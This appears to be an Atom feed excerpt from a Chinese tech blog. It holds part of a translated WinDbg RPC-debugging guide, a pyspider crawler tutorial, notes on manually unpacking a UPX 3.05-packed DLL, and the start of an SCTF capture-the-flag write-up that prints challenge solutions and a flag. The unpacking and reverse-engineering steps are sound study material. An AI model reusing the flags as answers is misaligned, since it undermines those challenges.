&lt;p&gt;4- 在知道你感兴趣的call之后，看看CONN/CLN所在的cell number，这个是连接对象的cell ID。这里是0000.0003。使用!rpcexts.getdbgcell加上这个id&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:001&amp;gt; !rpcexts.getdbgcell 3d4 0.3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Getting cell info ...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Connection&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Connection flags: Exclusive&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Authentication Level: Default&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Authentication Service: None&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Last Transmit Fragment Size: 24 (0x6F56D)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Endpoint for the connection: 0x0.1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Last send time (in seconds since boot):10595.565 (0x2963.235)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Last receive time (in seconds since boot):10595.565 (0x2963.235)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Getting endpoint info ...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Process object for caller is 0xFF9DF5F0&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个命令显示了这个连接的客户端的所有信息。实际的信息会有很多不同，跟使用的transport有关系。&lt;br&gt;在这个例子中，使用的本地命令管道通信，调用者的进程对象地址也显示了。如果你挂载了内核调试器（或者启动一个本地调试器），你可以使用!process看到看看这个地址的信息。&lt;br&gt;如果使用LRPC通信，会显示进程ID和线程ID。&lt;br&gt;如果使用TCP通信，会显示调用者的IP地址。&lt;br&gt;如果使用了远程命名管道，不会显示任何信息。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;转载请注明出处，谢谢！&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;最近在调试rpc，没法子，翻译了一下windbg这篇调试RPC的文档，后面可能还有其他内容，也就弄个系列吧&lt;br&gt;算是自己的笔记，有看客的话，可以多多指出问题，提提建议，不吝赐教！&lt;/p&gt;
&lt;p&gt;微软的远程过程调用（RPC）可以轻松越过进程和机器的界限并且进行数据通信。这种网络通信标准是微软Window网络通信如此强大的原因（….太绕了，翻不来，也不重要）。&lt;br&gt;然而，因为RPC对进程隐藏了网络调用，所以隐藏了计算机之间的交互细节。这使得用户很难确认线程为什么这么做，正在做什么，为什么在支持的功能上失败。所以，调试和解决RPC错误非常困难。另外，大部分RPC错误的问题实际上出现在配置问题，网络连接问题，其他组件问题上。&lt;br&gt;
    
    </summary>
    
      <category term="debug" scheme="http://anhkgg.github.io/categories/debug/"/>
    
    
      <category term="Windbg调试" scheme="http://anhkgg.github.io/tags/Windbg%E8%B0%83%E8%AF%95/"/>
    
      <category term="RPC" scheme="http://anhkgg.github.io/tags/RPC/"/>
    
      <category term="远程过程调用" scheme="http://anhkgg.github.io/tags/%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>linux pyspider learning</title>
    <link href="http://anhkgg.github.io/linux-pyspider-learning/"/>
    <id>http://anhkgg.github.io/linux-pyspider-learning/</id>
    <published>2015-01-24T10:54:17.000Z</published>
    <updated>2016-07-07T04:27:03.432Z</updated>
    
    <content type="html">&lt;h1 id=&quot;1-创建工程&quot;&gt;&lt;a href=&quot;#1-创建工程&quot; class=&quot;headerlink&quot; title=&quot;1. 创建工程&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. 创建工程&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;运行pyspider，然后浏览器中输入localhost:5000，即可进入project管理，Create创建新的project&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;2-编码&quot;&gt;&lt;a href=&quot;#2-编码&quot; class=&quot;headerlink&quot; title=&quot;2. 编码&quot;&gt;&lt;/a&gt;&lt;strong&gt;2. 编码&lt;/strong&gt;&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;from pyspider.libs.base_handler import * &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;import re &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;class Handler(BaseHandler): &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;crawl_config = &amp;#123; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;@every(minutes=24 * 60) &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;def on_start(self): &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;for i in range(1, 287): &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;self.crawl(&amp;apos;http://xxx?ajax=1&amp;amp;major=73&amp;amp;showMore=0&amp;amp;refer=cindex&amp;amp;page=&amp;apos;+str(i)+&amp;apos;&amp;amp;_CSRFToken=&amp;apos;, callback=self.index_page) &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;@config(age=10 * 24 * 60 * 60) &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;def index_page(self, response): &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;#print response.json[&amp;apos;data&amp;apos;] &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;total = response.json[&amp;apos;data&amp;apos;][&amp;apos;total&amp;apos;] &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;lists = response.json[&amp;apos;data&amp;apos;][&amp;apos;lists&amp;apos;] &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;#print total, len(lists) &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;for i in range(0, len(lists)): &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;url = lists[i][&amp;apos;url&amp;apos;]; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;#if re.match(&amp;quot;http://xxx?/corp/\d+/project/\d+&amp;quot;, url): &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;self.crawl(url, callback=self.detail_page) &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;def detail_page(self, response): &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;#信息过滤提取&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;content = response.doc(&amp;apos;div.position-content&amp;apos;).text() &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if content == &amp;quot;&amp;quot; or content == None: &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;content = response.doc(&amp;apos;div.project-info &amp;gt; div.pro-detail&amp;apos;).text() &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;return &amp;#123; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;url&amp;quot;: response.url, &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;title&amp;quot;: response.doc(&amp;apos;title&amp;apos;).text(), &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;content&amp;quot;: content &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;self.crawl(url, callback)抓取网页，callback为响应函数&lt;br&gt;def callback(self, response),response表示内容，可以通过response.doc(‘各类选择器’).text()获取到需要的内容&lt;br&gt;更多response的操作可以查看&lt;a href=&quot;http://docs.pyspider.org/en/latest/apis/Response/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;pyspider response&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;注意：&lt;/em&gt;&lt;br&gt;由于 response.doc是一个&lt;a href=&quot;https://pythonhosted.org/pyquery/#quickstart&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;pyquery&lt;/a&gt;对象，信息过滤中可以使用css选择器&lt;br&gt;pyspider自带css选择器生成，但是貌似不能使用&lt;br&gt;在浏览器中f12，也可以自动生成选择器&lt;br&gt;&lt;img src=&quot;/img/css_select.png&quot; alt=&quot;img&quot;&gt;&lt;br&gt;在生成的选择其中，如&amp;lt;#pagecontent &amp;gt; table:nth-child(3) &amp;gt; tbody &amp;gt; tr:nth-child(2) &amp;gt; td:nth-child(2) &amp;gt; table &amp;gt; tbody &amp;gt; tr &amp;gt; td &amp;gt; div:nth-child(2)&amp;gt;&lt;br&gt;需要去掉其中的tbody标签，否则无法使用，是否还有其他标签，没有过多测试&lt;br&gt;其实css选择器不用从上到下完整的生成，只要能够唯一获取指定的元素即可&lt;/p&gt;
&lt;h1 id=&quot;3-调试&quot;&gt;&lt;a href=&quot;#3-调试&quot; class=&quot;headerlink&quot; title=&quot;3. 调试&quot;&gt;&lt;/a&gt;&lt;strong&gt;3. 调试&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;第一次run，调用on_start，crawl指定的url，然后调用callback函数，界面显示如图&lt;br&gt;&lt;img src=&quot;/img/pyspider_d1.png&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;
&lt;p&gt;切换到follow窗口，可以看到符合callback函数的url列表&lt;br&gt;&lt;img src=&quot;/img/pyspider_d2.png&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;
&lt;p&gt;点击列表中右侧播放按钮，crawl该页面，获取符合规则的url，调用下一个callback&lt;br&gt;&lt;img src=&quot;/img/pyspider_d3.png&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后继续播放按钮，可能就是需要页面内容过滤了，根据自己的需求进行过滤&lt;br&gt;return返回的内容会写入数据库&lt;/p&gt;
&lt;h1 id=&quot;4-调试好之后，run&quot;&gt;&lt;a href=&quot;#4-调试好之后，run&quot; class=&quot;headerlink&quot; title=&quot;4.  调试好之后，run&quot;&gt;&lt;/a&gt;&lt;strong&gt;4.  调试好之后，run&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/img/pyspider_d4.png&quot; alt=&quot;img&quot;&gt;&lt;br&gt;然后就可以在results页面看到爬取结果了。&lt;br&gt;&lt;img src=&quot;/img/pyspider_d5.png&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-创建工程&quot;&gt;&lt;a href=&quot;#1-创建工程&quot; class=&quot;headerlink&quot; title=&quot;1. 创建工程&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. 创建工程&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;运行pyspider，然后浏览器中输入localhost:5000，即可进入project管理，Create创建新的project&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="http://anhkgg.github.io/categories/python/"/>
    
    
      <category term="pyspider" scheme="http://anhkgg.github.io/tags/pyspider/"/>
    
  </entry>
  
  <entry>
    <title>upx3.05手脱笔记</title>
    <link href="http://anhkgg.github.io/upx3-05%E6%89%8B%E8%84%B1%E7%AC%94%E8%AE%B0/"/>
    <id>http://anhkgg.github.io/upx3-05手脱笔记/</id>
    <published>2015-01-07T06:57:42.000Z</published>
    <updated>2015-01-07T07:14:13.000Z</updated>
    
    <content type="html">&lt;p&gt;本来一直对upx3.0以后加密壳挺畏惧的，其逻辑看起来挺简单的，有想逆一把的想法，但是都没实施，今天又遇到了，没法，太急，去google了一下，找到几篇资料&lt;br&gt;但是年代都挺久远的，看到[1]中直接esp定律就脱了，有点不信，就试了试，靠，居然可以，只能表示，实践是检验真理的唯一标准。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;#&lt;strong&gt;1. 查壳&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;[!] UPX 3.05 compressed !&lt;/strong&gt;&lt;br&gt;查出来是3.05，也不知道是不是误报，比[1]中版本高了点，所以也就是尝试尝试esp定律拖一下&lt;/p&gt;
&lt;p&gt;#&lt;strong&gt;2. 脱壳&lt;/strong&gt;&lt;br&gt;OD加载（是个dll，通过load.exe加载），在DllMain断下，看到熟悉的pushad，感觉方法可能靠谱了&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;103432E0 &amp;gt;  807C24 08 01    cmp byte ptr ss:[esp+0x8],0x1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;103432E5    0F85 9D0B0000   jnz xxx.10343E88&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;103432EB    60              pushad&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;103432EC    BE 00C02C10     mov esi,xxx.102CC000&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;f8到103432EC ，在数据窗口显示esp值，然后右键下了个硬件访问断点（其实以前尝试过，但是下的是内存访问断点，失败了，也不知道是不是这个原因，待会儿试试）。接着F9，断在了下面的代码中，看不出啥，就有个 jmp xxx.100C3C71，地址离当前地址还算较远，可能是另一个节&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;10343E7B    8D4424 80       lea eax,dword ptr ss:[esp-0x80] //这个就是先前pushad压入的吗？？&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10343E7F    6A 00           push 0x0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10343E81    39C4            cmp esp,eax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10343E83  ^ 75 FA           jnz short xxx.10343E7F //循环了多次，F4直接到10343E85  ，应该是在清理堆栈吧？？  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10343E85    83EC 80         sub esp,-0x80&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10343E88  - E9 E4FDD7FF     jmp xxx.100C3C71&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;100C3C71   /E9 CA371100     jmp xxx.101D7440&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;100C3C76   |E9 15311700     jmp xxx.10236D90                           ; jmp 到 kernel32.UnlockFile&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;单步到jmp，F8跟到其代码中，看到了熟悉的一段入口代码：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;101D7440    8BFF            mov edi,edi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101D7442    55              push ebp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101D7443    8BEC            mov ebp,esp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101D7445    837D 0C 01      cmp dword ptr ss:[ebp+0xC],0x1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101D7449    75 05           jnz short xxx.101D7450&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101D744B    E8 32DFEEFF     call xxx.100C5382&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101D7450    8B45 10         mov eax,dword ptr ss:[ebp+0x10]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101D7453    50              push eax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101D7454    8B4D 0C         mov ecx,dword ptr ss:[ebp+0xC]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101D7457    51              push ecx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101D7458    8B55 08         mov edx,dword ptr ss:[ebp+0x8]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101D745B    52              push edx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101D745C    E8 1F000000     call xxx.101D7480&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101D7461    83C4 0C         add esp,0xC&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101D7464    5D              pop ebp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101D7465    C2 0C00         retn 0xC&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;通过堆栈参数，进一步确认了下，这是DllMain函数&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0006F880   7C92118A  返回到 ntdll.7C92118A&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0006F884   10000000  xxx.10000000&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0006F888   00000001&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0006F88C   00000000&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后在101D7440地址，尝试dump，成功之后在检测壳信息&lt;br&gt;&lt;strong&gt;[CompilerDetect] -&amp;gt; Visual C++ 9.0 (Visual Studio 2008)&lt;/strong&gt;&lt;br&gt;应该是脱壳成功了，但是iat没有修复，先ida看看是否需要修复&lt;/p&gt;
&lt;p&gt;#&lt;strong&gt;3. 修复&lt;/strong&gt;&lt;br&gt;如果需要修复，使用importRec工具&lt;br&gt;&lt;img src=&quot;/img/fix.png&quot; alt=&quot;img&quot;&gt;&lt;br&gt;找到进程，选择目标dll，然后填入OEP，修复即可&lt;/p&gt;
&lt;p&gt;#&lt;strong&gt;4. 参考&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[1]: &lt;a href=&quot;http://bbs.pediy.com/showthread.php?t=44125&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://bbs.pediy.com/showthread.php?t=44125&lt;/a&gt; 【原创】手脱 UPX3.0&lt;br&gt;[2]: &lt;a href=&quot;http://bbs.pediy.com/showthread.php?t=140312&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://bbs.pediy.com/showthread.php?t=140312&lt;/a&gt; 【原创】UPX3.03脱壳机-学习版[代码更新]&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本来一直对upx3.0以后加密壳挺畏惧的，其逻辑看起来挺简单的，有想逆一把的想法，但是都没实施，今天又遇到了，没法，太急，去google了一下，找到几篇资料&lt;br&gt;但是年代都挺久远的，看到[1]中直接esp定律就脱了，有点不信，就试了试，靠，居然可以，只能表示，实践是检验真理的唯一标准。&lt;/p&gt;
    
    </summary>
    
      <category term="reverse" scheme="http://anhkgg.github.io/categories/reverse/"/>
    
    
      <category term="upx" scheme="http://anhkgg.github.io/tags/upx/"/>
    
      <category term="unpack" scheme="http://anhkgg.github.io/tags/unpack/"/>
    
  </entry>
  
  <entry>
    <title>xctf sctf summary, little writeup</title>
    <link href="http://anhkgg.github.io/sctf-summary/"/>
    <id>http://anhkgg.github.io/sctf-summary/</id>
    <published>2014-12-07T13:02:23.000Z</published>
    <updated>2016-07-07T04:28:44.869Z</updated>
    
    <content type="html">&lt;h1 id=&quot;1-Misc10&quot;&gt;&lt;a href=&quot;#1-Misc10&quot; class=&quot;headerlink&quot; title=&quot;1. Misc10&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. Misc10&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;xctf优良传统，百度之&lt;br&gt;手持两把锟斤拷，口中疾呼烫烫烫&lt;br&gt;脚踏千朵屯屯屯，笑看万物锘锘锘&lt;br&gt;其实我没提交，队友提交的，应该是这个&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;2-Re50&quot;&gt;&lt;a href=&quot;#2-Re50&quot; class=&quot;headerlink&quot; title=&quot;2. Re50&quot;&gt;&lt;/a&gt;&lt;strong&gt;2. Re50&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;听说逆向都挺难的，这里有个简单的，快来秒~~~ :D&lt;/p&gt;
&lt;p&gt;逆向题把我们逼疯了，才弄个这个出来，秀优越吗？&lt;br&gt;队友做的，看了一下，很简单&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;k = &amp;quot;Jr3gFud6n&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;flag = &amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;for i in range(0, len(k)):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    a = ord(k[i])-3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    flag += chr(a)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;print flag&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;#应该是这个SCTF&amp;#123;Go0dCra3k&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&quot;3-Misc100&quot;&gt;&lt;a href=&quot;#3-Misc100&quot; class=&quot;headerlink&quot; title=&quot;3. Misc100&quot;&gt;&lt;/a&gt;&lt;strong&gt;3. Misc100&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;简单的贪吃蛇，吃到30分它就告诉你flag！但是要怎么控制它呢? &lt;/p&gt;
&lt;p&gt;妹的，确定是100的，搞了老半天，还是linux的，upx加壳，首先就乱了&lt;br&gt;好吧，过了不知道多久，回过神来，upx脱壳，ida加载分析，大致弄清楚流程，代码用到了几个关键函数：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;move移动光标&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;printw显示字符&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
